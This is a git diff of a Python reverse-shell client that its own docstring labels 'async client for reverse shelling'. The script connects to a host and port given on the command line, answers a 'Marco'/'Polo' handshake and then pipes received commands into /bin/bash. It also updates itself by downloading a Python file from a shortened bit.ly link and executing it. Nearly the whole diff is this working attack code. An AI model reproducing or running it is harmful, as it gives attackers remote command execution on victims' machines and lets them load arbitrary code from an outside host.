@@ -2,24 +2,27 @@
 Async client for reverse shelling ୧༼ಠ益ಠ༽︻╦╤─
 
 Expects server ip and port as command line arguments
-Executes /bin/bash and hooks up stdin/stderr/stdout to network sockets
+Executes /bin/bash and uses Streamread/Streamwrite as its stdin/stdout
+    Connection (TCP) is kept open until closed by server
 
-Updates/changes by executing the .py downloaded from REMOTE
+Updates itself by executing the .py downloaded from RELEASE
 """
 
 import urllib.request
-import asyncio
+import subprocess
+import logging
+import socket
+import time
 import sys
 import os
-import logging
 
 HOST = sys.argv[1]
-PORT = sys.argv[2]
+PORT = int(sys.argv[2])
 
-REMOTE = "https://bit.ly/2Cp4hXU"
+RELEASE = "https://bit.ly/2Cp4hXU"
 
 
-def restart(file_url=REMOTE, generation=0):
+def restart(file_url=RELEASE, generation=0):
     script_name = "client{}.py".format(generation)
     urllib.request.urlretrieve(file_url, script_name)
     pythonpath = sys.executable
@@ -36,60 +39,68 @@ logger.addHandler(fh)
 
 logger.info(sys.version_info)
 
-
-async def main():
-    try:
-        await connect_to_server("Marco", loop=asyncio.get_event_loop())
-    except ConnectionRefusedError:
-        restart()
+print(sys.byteorder)
 
 
-async def connect_to_server(message, loop):
+def subp_run(command):
+    return subprocess.run(command, shell=True,
+                          stdout=subprocess.PIPE,
+                          stderr=subprocess.STDOUT,
+                          stdin=subprocess.PIPE,
+                          timeout=None)
 
-    try:
-        reader, writer = await asyncio.open_connection(HOST, PORT, loop=loop)
-    except ConnectionRefusedError as err:
-        logger.debug(err)
-        return
+def ping():
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        try:
+            s.connect((HOST, PORT))
+            s.sendall(b'Marco')
+            data = s.recv(4)
+            print('Received', repr(data))
 
-    print("Sending: {}".format(message))
-    writer.write(message.encode())
-    await writer.drain()
+        except ConnectionRefusedError as err:
+            logger.warning(err)
+            restart()
+            return err
 
-    try:
-        data = await reader.readexactly(4)
-        assert data.decode() == 'Polo'
-    except AssertionError as err:
-        logger.error(err)
-        return
-    print("Received polo")
+        if data == b'Polo':
+            data = s.recv(1024)  # TODO timeout before back to pinging
+            if data == b'SHELL':
+                print(data)
+                loop_shell(s)
+        else:
+            time.sleep(5)
+            ping()
+
+def loop_shell(s: socket):
+
+    proc = subprocess.Popen(['/bin/bash'],
+                            shell=False,
+                            stdin=subprocess.PIPE,
+                            stdout=subprocess.PIPE,
+                            stderr=subprocess.STDOUT,
+                            bufsize=0)
+
+    while True:
+        data = s.recv(1024)
+        print(data)
+        assert data[-4:] == b' AYE'
+        proc.stdin.write(data[:-4]+b'\n')
+        time.sleep(1)
+        print(proc.stdout.readline())
+
+# loop_shell(1)
+data = ping()
 
 
-async def capture_subp(command):
-    process = await asyncio.create_subprocess_shell(
-        command,
-        stdout=asyncio.subprocess.PIPE,
-        stderr=asyncio.subprocess.STDOUT
-    )
-    stdout, stderr = await process.communicate()
-    return process.returncode, stdout
 
 
-# async def update():
-#    asyncio.create_subprocess_shell("wget www.google.com",
-#                                    stdin=subprocess.PIPE)
-# Receive from wget https://bit.ly/2Cp4hXU
+#if __name__ == "__main__":
+#    import pathlib
+#    import sys
+#    assert sys.version_info >= (3, 7), "Pls"
+#    here = pathlib.Path(__file__).parent
+#    logpath = here.joinpath("client.log")
 
-
-if __name__ == "__main__":
-    import pathlib
-    import sys
-
-    assert sys.version_info >= (3, 7), "Pls"
-    here = pathlib.Path(__file__).parent
-    logpath = here.joinpath("client.log")
-
-    asyncio.run(main())
 
 # socket family is AF_INET (ipv4)
 # socket type is SOCK_STREAM (connection oriented TCP protocol)
